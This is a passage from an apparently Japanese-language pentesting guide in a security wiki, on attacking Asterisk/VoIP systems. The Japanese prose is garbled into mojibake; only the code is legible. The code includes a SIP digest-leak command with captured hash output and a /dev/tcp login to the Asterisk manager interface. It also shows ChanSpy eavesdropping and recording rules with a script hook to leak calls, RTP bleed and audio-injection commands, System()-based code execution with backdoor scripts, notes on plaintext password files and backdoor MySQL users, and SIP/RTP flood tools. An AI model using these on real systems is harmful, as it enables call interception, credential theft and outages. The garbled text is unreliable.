* [**sippts**](https://github.com/Pepelux/sippts)**ã‹ã‚‰ã®SIPPTS leak**ï¼šSIPPTS leak ã¯å¤šæ•°ã® SIP é›»è©±æ©Ÿã«å½±éŸ¿ã‚’ä¸ãˆã‚‹ SIP Digest Leak è„†å¼±æ€§ã‚’æ‚ªç”¨ã—ã¾ã™ã€‚å‡ºåŠ›ã¯ SipCrack å½¢å¼ã§ä¿å­˜ã•ã‚Œã€SIPPTS dcrack ã¾ãŸã¯ SipCrack ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ç·å½“ãŸã‚Šæ”»æ’ƒã‚’è¡Œã†ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
sippts leak -i 10.10.0.10

[!] Target: 10.10.0.10:5060/UDP
[!] Caller: 100
[!] Callee: 100

[=>] Request INVITE
[<=] Response 100 Trying
[<=] Response 180 Ringing
[<=] Response 200 OK
[=>] Request ACK
... waiting for BYE ...
[<=] Received BYE
[=>] Request 407 Proxy Authentication Required
[<=] Received BYE with digest
[=>] Request 200 Ok

Auth=Digest username="pepelux", realm="asterisk", nonce="lcwnqoz0", uri="sip:100@10.10.0.10:56583;transport=UDP", response="31fece0d4ff6fd524c1d4c9482e99bb2", algorithm=MD5
```
### Click2Call

Click2Callã¯ã€ä¾‹ãˆã°è£½å“ã«èˆˆå‘³ã‚’æŒã£ã¦ã„ã‚‹**Webãƒ¦ãƒ¼ã‚¶ãƒ¼**ãŒ**é›»è©±ç•ªå·**ã‚’å…¥åŠ›ã—ã¦é›»è©±ã‚’å—ã‘ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ã€‚ãã®å¾Œã€å•†ç”¨ãŒå‘¼ã³å‡ºã•ã‚Œã€ãƒ¦ãƒ¼ã‚¶ãƒ¼ãŒ**é›»è©±ã«å‡ºã‚‹ã¨**ã‚¨ãƒ¼ã‚¸ã‚§ãƒ³ãƒˆã¨æ¥ç¶šã•ã‚Œã¾ã™ã€‚

ã“ã‚Œã«å¯¾ã™ã‚‹ä¸€èˆ¬çš„ãªAsteriskãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«ã¯æ¬¡ã®ã¨ãŠã‚Šã§ã™ï¼š
```scss
[web_user]
secret = complex_password
deny = 0.0.0.0/0.0.0.0
allow = 0.0.0.0/0.0.0.0
displayconnects = yes
read = system,call,log,verbose,agent,user,config,dtmf,reporting,crd,diapla
write = system,call,agent,user,config,command,reporting,originate
```
* å‰ã®ãƒ—ãƒ­ãƒ•ã‚¡ã‚¤ãƒ«ã¯ã€**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒã‚ã‹ã£ã¦ã„ã‚Œã°ã©ã‚“ãªIPã‚¢ãƒ‰ãƒ¬ã‚¹ã§ã‚‚æ¥ç¶šã§ãã‚‹**ã‚ˆã†ã«ãªã£ã¦ã„ã¾ã™ã€‚
* å‰è¿°ã®ã‚ˆã†ã«ã€**é€šè©±ã‚’é–‹å§‹ã™ã‚‹**ã«ã¯ã€**èª­ã¿å–ã‚Šæ¨©é™ã¯å¿…è¦ã‚ã‚Šã¾ã›ã‚“**ã€**æ›¸ãè¾¼ã¿**ã§**ç™ºä¿¡**ã ã‘ãŒå¿…è¦ã§ã™ã€‚

ã“ã‚Œã‚‰ã®æ¨©é™ãŒã‚ã‚Œã°ã€ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’çŸ¥ã£ã¦ã„ã‚‹ä»»æ„ã®IPãŒæ¥ç¶šã—ã¦ã€æƒ…å ±ã‚’æŠ½å‡ºã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚
```bash
# Get all the peers
exec 3<>/dev/tcp/10.10.10.10/5038 && echo -e "Action: Login\nUsername:test\nSecret:password\nEvents: off\n\nAction:Command\nCommand: sip show peers\n\nAction: logoff\n\n">&3 && cat <&3
```
{% endcode %}

**è¿½åŠ ã®æƒ…å ±ã‚„ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ãŒè¦æ±‚ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚**

### **ç›—è´**

Asteriskã§ã¯ã€**`ChanSpy`** ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦ã€ç›£è¦–ã™ã‚‹**å†…ç·š**ï¼ˆã¾ãŸã¯ã™ã¹ã¦ã®å†…ç·šï¼‰ã‚’æŒ‡å®šã—ã¦ã€ç™ºç”Ÿã—ã¦ã„ã‚‹ä¼šè©±ã‚’èãã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ã“ã®ã‚³ãƒãƒ³ãƒ‰ã¯å†…ç·šã«å‰²ã‚Šå½“ã¦ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ã€‚

ãŸã¨ãˆã°ã€**`exten => 333,1,ChanSpy('all',qb)`** ã¨ã™ã‚‹ã¨ã€**å†…ç·š333** ã«**é›»è©±ã‚’ã‹ã‘ã‚‹**ã¨ã€**ã™ã¹ã¦**ã®å†…ç·šã‚’**ç›£è¦–**ã—ã€æ–°ã—ã„ä¼šè©±ãŒå§‹ã¾ã‚‹ãŸã³ã«ï¼ˆ**`b`**ï¼‰ã€**é™ã‹ãªãƒ¢ãƒ¼ãƒ‰**ï¼ˆ**`q`**ï¼‰ã§**èãå§‹ã‚ã¾ã™**ã€‚ä¼šè©±ã‚’èã„ã¦ã„ã‚‹ã¨ãã«ã€**`*`** ã‚’æŠ¼ã™ã‹ã€å†…ç·šç•ªå·ã‚’ãƒãƒ¼ã‚¯ã™ã‚‹ã“ã¨ã§ã€åˆ¥ã®ä¼šè©±ã«ç§»å‹•ã§ãã¾ã™ã€‚

**`ExtenSpy`** ã‚’ä½¿ç”¨ã—ã¦ã€1ã¤ã®å†…ç·šã®ã¿ã‚’ç›£è¦–ã™ã‚‹ã“ã¨ã‚‚å¯èƒ½ã§ã™ã€‚

ä¼šè©±ã‚’èãä»£ã‚ã‚Šã«ã€**ãƒ•ã‚¡ã‚¤ãƒ«ã«è¨˜éŒ²ã™ã‚‹**ã“ã¨ã‚‚ã§ãã¾ã™ã€‚æ¬¡ã®ã‚ˆã†ãªå†…ç·šã‚’ä½¿ç”¨ã—ã¦ã€ä¼šè©±ã‚’è¨˜éŒ²ã§ãã¾ã™ï¼š

{% code overflow="wrap" %}
```scss
[recorded-context]
exten => _X.,1,Set(NAME=/tmp/${CONTEXT}_${EXTEN}_${CALLERID(num)}_${UNIQUEID}.wav)
exten => _X.,2,MixMonitor(${NAME})
```
{% endcode %}

é€šè©±ã¯**`/tmp`**ã«ä¿å­˜ã•ã‚Œã¾ã™ã€‚

AsteriskãŒé–‰ã˜ã‚‰ã‚Œã‚‹ã¨ã€é€šè©±å†…å®¹ã‚’**æ¼æ´©**ã™ã‚‹ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’å®Ÿè¡Œã•ã›ã‚‹ã“ã¨ã•ãˆã§ãã¾ã™ã€‚
```scss
exten => h,1,System(/tmp/leak_conv.sh &)
```
### RTCPBleedè„†å¼±æ€§

**RTCPBleed**ã¯ã€2017å¹´ã«å…¬é–‹ã•ã‚ŒãŸAsteriskãƒ™ãƒ¼ã‚¹ã®VoIPã‚µãƒ¼ãƒãƒ¼ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹é‡å¤§ãªã‚»ã‚­ãƒ¥ãƒªãƒ†ã‚£å•é¡Œã§ã™ã€‚ã“ã®è„†å¼±æ€§ã«ã‚ˆã‚Šã€VoIPä¼šè©±ã‚’é‹ã¶**RTPï¼ˆReal Time Protocolï¼‰ãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯**ãŒã€ã‚¤ãƒ³ã‚¿ãƒ¼ãƒãƒƒãƒˆä¸Šã®èª°ã§ã‚‚ã«ã‚ˆã£ã¦**å‚å—ãŠã‚ˆã³ãƒªãƒ€ã‚¤ãƒ¬ã‚¯ãƒˆ**ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚ã“ã‚Œã¯ã€RTPãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ãŒNATï¼ˆNetwork Address Translationï¼‰ãƒ•ã‚¡ã‚¤ã‚¢ã‚¦ã‚©ãƒ¼ãƒ«ã‚’çµŒç”±ã™ã‚‹éš›ã«èªè¨¼ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ãŸã‚ã«ç™ºç”Ÿã—ã¾ã™ã€‚

RTPãƒ—ãƒ­ã‚­ã‚·ã¯ã€RTCã‚·ã‚¹ãƒ†ãƒ ã«å½±éŸ¿ã‚’ä¸ãˆã‚‹**NATã®åˆ¶é™**ã«å¯¾å‡¦ã™ã‚‹ãŸã‚ã«ã€2ã¤ä»¥ä¸Šã®ãƒ‘ãƒ¼ãƒ†ã‚£ãƒ¼é–“ã§RTPã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’ãƒ—ãƒ­ã‚­ã‚·ãƒ³ã‚°ã™ã‚‹ã“ã¨ã‚’è©¦ã¿ã¾ã™ã€‚NATãŒå­˜åœ¨ã™ã‚‹å ´åˆã€RTPãƒ—ãƒ­ã‚­ã‚·ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã¯ã€é€šä¿¡ï¼ˆä¾‹ï¼šSIPï¼‰ã‚’ä»‹ã—ã¦å–å¾—ã—ãŸRTP IPãŠã‚ˆã³ãƒãƒ¼ãƒˆæƒ…å ±ã«ä¾å­˜ã§ããªã„ã“ã¨ãŒã‚ˆãã‚ã‚Šã¾ã™ã€‚ãã®ãŸã‚ã€å¤šãã®RTPãƒ—ãƒ­ã‚­ã‚·ã¯ã€ãã®ã‚ˆã†ãª**IPãŠã‚ˆã³ãƒãƒ¼ãƒˆã®çµ„ã¿åˆã‚ã›ãŒè‡ªå‹•çš„ã«å­¦ç¿’ã•ã‚Œã‚‹**ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã‚’å®Ÿè£…ã—ã¦ã„ã¾ã™ã€‚ã“ã‚Œã¯ã€ç€ä¿¡RTPãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’æ¤œæŸ»ã—ã€ç€ä¿¡RTPãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã®ã‚½ãƒ¼ã‚¹IPãŠã‚ˆã³ãƒãƒ¼ãƒˆã‚’å¿œç­”ã™ã¹ãã‚‚ã®ã¨ã—ã¦ãƒãƒ¼ã‚¯ã™ã‚‹ã“ã¨ã§è¡Œã‚ã‚Œã‚‹ã“ã¨ãŒã‚ˆãã‚ã‚Šã¾ã™ã€‚ã“ã®ãƒ¡ã‚«ãƒ‹ã‚ºãƒ ã¯é€šå¸¸ã€ã€Œå­¦ç¿’ãƒ¢ãƒ¼ãƒ‰ã€ã¨å‘¼ã°ã‚Œã€**ã„ã‹ãªã‚‹ç¨®é¡ã®èªè¨¼ã‚‚ä½¿ç”¨ã—ã¾ã›ã‚“**ã€‚ã—ãŸãŒã£ã¦ã€**æ”»æ’ƒè€…**ã¯**RTPãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’RTPãƒ—ãƒ­ã‚­ã‚·ã«é€ä¿¡**ã—ã€é€²è¡Œä¸­ã®RTPã‚¹ãƒˆãƒªãƒ¼ãƒ ã®ç™ºä¿¡è€…ã¾ãŸã¯ç€ä¿¡è€…å‘ã‘ã«æ„å›³ã•ã‚Œã¦ã„ã‚‹ãƒ—ãƒ­ã‚­ã‚·ã•ã‚ŒãŸRTPãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’å—ä¿¡ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã‚Œã‚’RTP Bleedã¨å‘¼ã³ã€æ”»æ’ƒè€…ãŒæ­£è¦ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã«é€ä¿¡ã•ã‚Œã‚‹ã¯ãšã®RTPãƒ¡ãƒ‡ã‚£ã‚¢ã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’å—ä¿¡ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™ã€‚

RTPãƒ—ãƒ­ã‚­ã‚·ã¨RTPã‚¹ã‚¿ãƒƒã‚¯ã®ã‚‚ã†1ã¤ã®èˆˆå‘³æ·±ã„å‹•ä½œã¯ã€**RTP Bleedã«è„†å¼±ã§ãªãã¦ã‚‚**ã€**ä»»æ„ã®ã‚½ãƒ¼ã‚¹ã‹ã‚‰ã®RTPãƒ‘ã‚±ãƒƒãƒˆã‚’å—ã‘å…¥ã‚Œã€è»¢é€ã€ãŠã‚ˆã³/ã¾ãŸã¯å‡¦ç†ã™ã‚‹**ã“ã¨ãŒã‚ã‚‹ã“ã¨ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€æ”»æ’ƒè€…ã¯æ­£è¦ã®ã‚‚ã®ã®ä»£ã‚ã‚Šã«è‡ªåˆ†ã®ãƒ¡ãƒ‡ã‚£ã‚¢ã‚’æ³¨å…¥ã™ã‚‹ã“ã¨ãŒã§ãã‚‹RTPãƒ‘ã‚±ãƒƒãƒˆã‚’é€ä¿¡ã§ãã¾ã™ã€‚ã“ã‚Œã‚’RTPã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³æ”»æ’ƒã¨å‘¼ã³ã€æ—¢å­˜ã®RTPã‚¹ãƒˆãƒªãƒ¼ãƒ ã«ä¸æ­£ãªRTPãƒ‘ã‚±ãƒƒãƒˆã‚’æ³¨å…¥ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®è„†å¼±æ€§ã¯ã€RTPãƒ—ãƒ­ã‚­ã‚·ã¨ã‚¨ãƒ³ãƒ‰ãƒã‚¤ãƒ³ãƒˆã®ä¸¡æ–¹ã§è¦‹ã¤ã‹ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

Asteriskã¨FreePBXã¯ã€å¾“æ¥ã€**`NAT=yes`è¨­å®š**ã‚’ä½¿ç”¨ã—ã¦ãŠã‚Šã€RTPãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ãŒèªè¨¼ã‚’ãƒã‚¤ãƒ‘ã‚¹ã™ã‚‹ã“ã¨ã‚’å¯èƒ½ã«ã—ã€é€šè©±æ™‚ã«éŸ³å£°ãŒãªã„ã‹ç‰‡æ–¹å‘ã®éŸ³å£°ã«ãªã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

è©³ç´°ã«ã¤ã„ã¦ã¯ã€[https://www.rtpbleed.com/](https://www.rtpbleed.com/)ã‚’å‚ç…§ã—ã¦ãã ã•ã„ã€‚

* [**sippts**](https://github.com/Pepelux/sippts)ã‹ã‚‰ã®**`SIPPTS rtpbleed`**ï¼šSIPPTS rtpbleedã¯ã€RTP Bleedè„†å¼±æ€§ã‚’æ¤œå‡ºã—ã€RTPã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’é€ä¿¡ã—ã¾ã™ã€‚
```bash
sippts rtpbleed -i 10.10.0.10
```
* **`SIPPTS rtcpbleed`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtcpbleedã¯ã€RTCPã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’é€ä¿¡ã—ã¦RTP Bleedè„†å¼±æ€§ã‚’æ¤œå‡ºã—ã¾ã™ã€‚
```bash
sippts rtcpbleed -i 10.10.0.10
```
* **`SIPPTS rtpbleedflood`** ã¯ [**sippts**](https://github.com/Pepelux/sippts)** ã‹ã‚‰:** SIPPTS rtpbleedflood ã¯ RTP ãƒ–ãƒªãƒ¼ãƒ‰è„†å¼±æ€§ã‚’æ‚ªç”¨ã—ã€RTP ã‚¹ãƒˆãƒªãƒ¼ãƒ ã‚’é€ä¿¡ã—ã¾ã™ã€‚
```bash
sippts rtpbleedflood -i 10.10.0.10 -p 10070 -v
```
* **`SIPPTS rtpbleedinject`** from [**sippts**](https://github.com/Pepelux/sippts)**:** SIPPTS rtpbleedinjectã¯ã€RTP Bleedè„†å¼±æ€§ã‚’æ‚ªç”¨ã—ã¦ã‚ªãƒ¼ãƒ‡ã‚£ã‚ªãƒ•ã‚¡ã‚¤ãƒ«ï¼ˆWAVå½¢å¼ï¼‰ã‚’æ³¨å…¥ã—ã¾ã™ã€‚
```bash
sippts rtpbleedinject -i 10.10.0.10 -p 10070 -f audio.wav
```
### RCE

Asteriskã§ä½•ã‚‰ã‹ã®æ–¹æ³•ã§**æ‹¡å¼µãƒ«ãƒ¼ãƒ«ã‚’è¿½åŠ ã—ã¦ãƒªãƒ­ãƒ¼ãƒ‰**ã™ã‚‹ã“ã¨ãŒã§ãã‚‹å ´åˆï¼ˆãŸã¨ãˆã°è„†å¼±æ€§ã®ã‚ã‚‹Webãƒãƒãƒ¼ã‚¸ãƒ£ãƒ¼ã‚µãƒ¼ãƒãƒ¼ã‚’ä¾µå®³ã™ã‚‹ã“ã¨ã§ï¼‰ã€**`System`**ã‚³ãƒãƒ³ãƒ‰ã‚’ä½¿ç”¨ã—ã¦RCEã‚’å–å¾—ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚
```scss
same => n,System(echo "Called at $(date)" >> /tmp/call_log.txt)
```
**`Shell`**ã¨ã„ã†ã‚³ãƒãƒ³ãƒ‰ã¯ã€å¿…è¦ã«å¿œã˜ã¦ã‚·ã‚¹ãƒ†ãƒ ã‚³ãƒãƒ³ãƒ‰ã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«**`System`**ã®ä»£ã‚ã‚Šã«ä½¿ç”¨ã§ãã¾ã™ã€‚

{% hint style="warning" %}
ã‚µãƒ¼ãƒãƒ¼ãŒ**`System`**ã‚³ãƒãƒ³ãƒ‰ã§ç‰¹å®šã®æ–‡å­—ã®ä½¿ç”¨ã‚’ç¦æ­¢ã—ã¦ã„ã‚‹å ´åˆï¼ˆElastixãªã©ï¼‰ã€ã‚¦ã‚§ãƒ–ã‚µãƒ¼ãƒãƒ¼ãŒã‚·ã‚¹ãƒ†ãƒ å†…ã§ä½•ã‚‰ã‹ã®æ–¹æ³•ã§ãƒ•ã‚¡ã‚¤ãƒ«ã‚’ä½œæˆã™ã‚‹ã“ã¨ã‚’è¨±å¯ã—ã¦ã„ã‚‹ã‹ã©ã†ã‹ã‚’ç¢ºèªã—ï¼ˆElastixã‚„trixboxã®ã‚ˆã†ã«ï¼‰ã€ãã‚Œã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒã‚¯ãƒ‰ã‚¢ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½œæˆã—ã€ãã®å¾Œ**`System`**ã‚’ä½¿ç”¨ã—ã¦ãã®**ã‚¹ã‚¯ãƒªãƒ—ãƒˆ**ã‚’**å®Ÿè¡Œ**ã—ã¾ã™ã€‚
{% endhint %}

#### èˆˆå‘³æ·±ã„ãƒ­ãƒ¼ã‚«ãƒ«ãƒ•ã‚¡ã‚¤ãƒ«ã¨æ¨©é™

* **`sip.conf`** -> SIPãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã¦ã„ã¾ã™ã€‚
* **Asteriskã‚µãƒ¼ãƒãƒ¼ãŒrootã¨ã—ã¦å®Ÿè¡Œã•ã‚Œã¦ã„ã‚‹**å ´åˆã€rootã‚’å±é™ºã«ã•ã‚‰ã™å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™
* **mysql rootãƒ¦ãƒ¼ã‚¶ãƒ¼**ã¯ãŠãã‚‰ã**ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã‚’æŒã£ã¦ã„ãªã„**ã‹ã‚‚ã—ã‚Œã¾ã›ã‚“ã€‚
* ã“ã‚Œã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒã‚¯ãƒ‰ã‚¢ã¨ã—ã¦æ–°ã—ã„mysqlãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã§ãã¾ã™
* **`FreePBX`**
* **`amportal.conf`** -> ã‚¦ã‚§ãƒ–ãƒ‘ãƒãƒ«ç®¡ç†è€…ï¼ˆFreePBXï¼‰ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã¦ã„ã¾ã™
* **`FreePBX.conf`** -> ãƒ‡ãƒ¼ã‚¿ãƒ™ãƒ¼ã‚¹ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã•ã‚Œã‚‹FreePBXãƒ¦ãƒ¼ã‚¶ãƒ¼ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒå«ã¾ã‚Œã¦ã„ã¾ã™
* ã“ã‚Œã‚’ä½¿ç”¨ã—ã¦ãƒãƒƒã‚¯ãƒ‰ã‚¢ã¨ã—ã¦æ–°ã—ã„mysqlãƒ¦ãƒ¼ã‚¶ãƒ¼ã‚’ä½œæˆã§ãã¾ã™
* **`Elastix`**
* **`Elastix.conf`** -> mysql rootãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã€IMAPdãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ã€Webç®¡ç†è€…ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãªã©ã€ã„ãã¤ã‹ã®ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãŒå¹³æ–‡ã§å«ã¾ã‚Œã¦ã„ã¾ã™
* **ã„ãã¤ã‹ã®ãƒ•ã‚©ãƒ«ãƒ€**ã¯ã€å±é™ºã«ã•ã‚‰ã•ã‚ŒãŸAsteriskãƒ¦ãƒ¼ã‚¶ãƒ¼ã«å±ã—ã¾ã™ï¼ˆrootã¨ã—ã¦å®Ÿè¡Œã•ã‚Œã¦ã„ãªã„å ´åˆï¼‰ã€‚ã“ã®ãƒ¦ãƒ¼ã‚¶ãƒ¼ã¯å‰è¿°ã®ãƒ•ã‚¡ã‚¤ãƒ«ã‚’èª­ã¿å–ã‚‹ã“ã¨ãŒã§ãã€ã¾ãŸæ§‹æˆã‚’åˆ¶å¾¡ã—ã¦ã„ã‚‹ãŸã‚ã€AsteriskãŒä»–ã®ãƒãƒƒã‚¯ãƒ‰ã‚¢ä»˜ããƒã‚¤ãƒŠãƒªã‚’å®Ÿè¡Œã™ã‚‹ã‚ˆã†ã«ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

### RTPã‚¤ãƒ³ã‚¸ã‚§ã‚¯ã‚·ãƒ§ãƒ³

**`rtpinsertsound`**ï¼ˆ`sudo apt install rtpinsertsound`ï¼‰ã‚„**`rtpmixsound`**ï¼ˆ`sudo apt install rtpmixsound`ï¼‰ãªã©ã®ãƒ„ãƒ¼ãƒ«ã‚’ä½¿ç”¨ã—ã¦ã€ä¼šè©±ã«**`.wav`**ã‚’æŒ¿å…¥ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

ã¾ãŸã€[http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/](http://blog.pepelux.org/2011/09/13/inyectando-trafico-rtp-en-una-conversacion-voip/)ã‹ã‚‰ã‚¹ã‚¯ãƒªãƒ—ãƒˆã‚’ä½¿ç”¨ã—ã¦ã€ä¼šè©±ã‚’**ã‚¹ã‚­ãƒ£ãƒ³**ã™ã‚‹ï¼ˆ**`rtpscan.pl`**ï¼‰ã€ä¼šè©±ã«`.wav`ã‚’é€ä¿¡ã™ã‚‹ï¼ˆ**`rtpsend.pl`**ï¼‰ã€ä¼šè©±ã«**ãƒã‚¤ã‚ºã‚’æŒ¿å…¥**ã™ã‚‹ï¼ˆ**`rtpflood.pl`**ï¼‰ã“ã¨ãŒã§ãã¾ã™ã€‚

### DoS

VoIPã‚µãƒ¼ãƒãƒ¼ã§DoSã‚’è©¦ã¿ã‚‹ãŸã‚ã®ã„ãã¤ã‹ã®æ–¹æ³•ãŒã‚ã‚Šã¾ã™ã€‚

* [**sippts**](https://github.com/Pepelux/sippts)ã‹ã‚‰ã®**`SIPPTS flood`**ï¼šSIPPTS floodã¯ã‚¿ãƒ¼ã‚²ãƒƒãƒˆã«ç„¡åˆ¶é™ã®ãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã‚’é€ä¿¡ã—ã¾ã™ã€‚
* `sippts flood -i 10.10.0.10 -m invite -v`
* [**sippts**](https://github.com/Pepelux/sippts)ã‹ã‚‰ã®**`SIPPTS ping`**ï¼šSIPPTS pingã¯ã‚µãƒ¼ãƒãƒ¼ã®å¿œç­”æ™‚é–“ã‚’ç¢ºèªã™ã‚‹ãŸã‚ã«SIP pingã‚’è¡Œã„ã¾ã™ã€‚
* `sippts ping -i 10.10.0.10`
* [**IAXFlooder**](https://www.kali.org/tools/iaxflood/)ï¼šAsteriskãŒä½¿ç”¨ã™ã‚‹IAXãƒ—ãƒ­ãƒˆã‚³ãƒ«ã«å¯¾ã™ã‚‹DoS
* [**inviteflood**](https://github.com/foreni-packages/inviteflood/blob/master/inviteflood/Readme.txt)ï¼šUDP/IPä¸Šã§SIP/SDP INVITEãƒ¡ãƒƒã‚»ãƒ¼ã‚¸ã®æ´ªæ°´ã‚’å®Ÿè¡Œã™ã‚‹ãƒ„ãƒ¼ãƒ«
* [**rtpflood**](https://www.kali.org/tools/rtpflood/)ï¼šã„ãã¤ã‹ã®é©åˆ‡ã«å½¢æˆã•ã‚ŒãŸRTPãƒ‘ã‚±ãƒƒãƒˆã‚’é€ä¿¡ã—ã¾ã™ã€‚ä½¿ç”¨ã•ã‚Œã¦ã„ã‚‹RTPãƒãƒ¼ãƒˆã‚’çŸ¥ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼ˆæœ€åˆã«ã‚¹ãƒ‹ãƒƒãƒ•ã‚£ãƒ³ã‚°ã™ã‚‹å¿…è¦ãŒã‚ã‚Šã¾ã™ï¼‰ã€‚
* [**SIPp**](https://github.com/SIPp/sipp)ï¼šSIPãƒˆãƒ©ãƒ•ã‚£ãƒƒã‚¯ã‚’åˆ†æãŠã‚ˆã³ç”Ÿæˆã™ã‚‹ã“ã¨ãŒã§ãã‚‹ãŸã‚ã€DoSã«ã‚‚ä½¿ç”¨ã§ãã¾ã™ã€‚
* [**SIPsak**](https://github.com/nils-ohlmeier/sipsak)ï¼šSIPã‚¹ã‚¤ã‚¹ã‚¢ãƒ¼ãƒŸãƒ¼ãƒŠã‚¤ãƒ•ã€‚SIPæ”»æ’ƒã‚’å®Ÿè¡Œã™ã‚‹ãŸã‚ã«ã‚‚ä½¿ç”¨ã§ãã¾ã™ã€‚
* Fuzzersï¼š[**protos-sip**](https://www.kali.org/tools/protos-sip/)ã€[**voiper**](https://github.com/gremwell/voiper)ã€‚

### OSã®è„†å¼±æ€§

Asteriskãªã©ã®ã‚½ãƒ•ãƒˆã‚¦ã‚§ã‚¢ã‚’ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã™ã‚‹æœ€ã‚‚ç°¡å˜ãªæ–¹æ³•ã¯ã€**FreePBXã€Elastixã€Trixbox**ãªã©ã€ã™ã§ã«ã‚¤ãƒ³ã‚¹ãƒˆãƒ¼ãƒ«ã•ã‚Œã¦ã„ã‚‹OSãƒ‡ã‚£ã‚¹ãƒˆãƒªãƒ“ãƒ¥ãƒ¼ã‚·ãƒ§ãƒ³ã‚’ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã™ã‚‹ã“ã¨ã§ã™ã€‚ãŸã ã—ã€ã“ã‚Œã‚‰ã®å•é¡Œã¯ä¸€åº¦å‹•ä½œã—ã¦ã„ã‚‹ã¨ã€ã‚·ã‚¹ãƒ†ãƒ ç®¡ç†è€…ãŒãã‚Œã‚‰ã‚’å†åº¦æ›´æ–°ã—ãªã„å¯èƒ½æ€§ãŒã‚ã‚Šã€æ™‚é–“ã®çµŒéã¨ã¨ã‚‚ã«**è„†å¼±æ€§**ãŒç™ºè¦‹ã•ã‚Œã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ã€‚

## å‚è€ƒæ–‡çŒ®

* [https://github.com/Pepelux/sippts/wiki](https://github.com/Pepelux/sippts/wiki)
* [https://github.com/EnableSecurity/sipvicious](https://github.com/EnableSecurity/sipvicious)
* [http://blog.pepelux.org/](http://blog.pepelux.org/)
* [https://www.rtpbleed.com/](https://www.rtpbleed.com/)
* [https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4](https://medium.com/vartai-security/practical-voip-penetration-testing-a1791602e1b4)
* [https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf](https://resources.enablesecurity.com/resources/sipdigestleak-tut.pdf)

<details>

<summary><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰ã§AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ã‚’ã”è¦§ãã ã•ã„ï¼</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•ï¼š

